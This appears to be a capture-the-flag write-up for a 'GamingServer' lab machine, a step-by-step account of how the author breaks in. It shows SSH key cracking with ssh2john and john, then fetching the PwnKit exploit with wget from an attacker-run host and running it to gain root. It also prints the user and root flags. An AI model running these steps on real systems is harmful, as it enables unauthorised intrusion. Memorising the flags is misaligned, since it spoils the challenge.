@@ -1,0 +1,117 @@
+
+IP - 10.10.22.164
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Found Username
+
+view-source:http://10.10.37.79/
+
+<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
+
+
+
+Found Password List
+
+http://10.10.22.164/uploads/dict.lst
+
+
+
+
+
+Found Secret Key
+
+http://10.10.22.164/secret/secretKey
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Crack Secret key with ssh2john and john
+
+1. ssh2john secretKey > id_rsa.hash
+2. john --wordlist=~/Desktop/THM_CTF/GamingServer/dict.lst id_rsa.hash
+
+Found john password
+
+letmein          (secretKey)
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ssh connect with john
+
+chmod 600 secretKey
+
+ssh john@10.10.37.79 -i secretKey
+
+passphrase - letmein
+
+
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+User Flag
+
+john@exploitable:~$ cat user.txt 
+a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Got root with PwnKit
+
+File sharing with python2
+
+From Victim
+
+john@exploitable:~$ cd /tmp
+john@exploitable:/tmp$ wget "http://10.17.8.93:8888/PwnKit"
+--2023-01-06 21:52:37--  http://10.17.8.93:8888/PwnKit
+Connecting to 10.17.8.93:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16800 (16K) [application/octet-stream]
+Saving to: ‘PwnKit’
+
+PwnKit                                         100%[====================================================================================================>]  16.41K  72.8KB/s    in 0.2s    
+
+2023-01-06 21:52:37 (72.8 KB/s) - ‘PwnKit’ saved [16800/16800]
+
+john@exploitable:/tmp$ chmod +x PwnKit 
+john@exploitable:/tmp$ ./PwnKit 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@exploitable:/tmp# whoami
+root
+
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+root flag
+
+root@exploitable:~# cat root.txt 
+2e337b8c9f3aff0c2b3e8d4e6a7c88fc
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
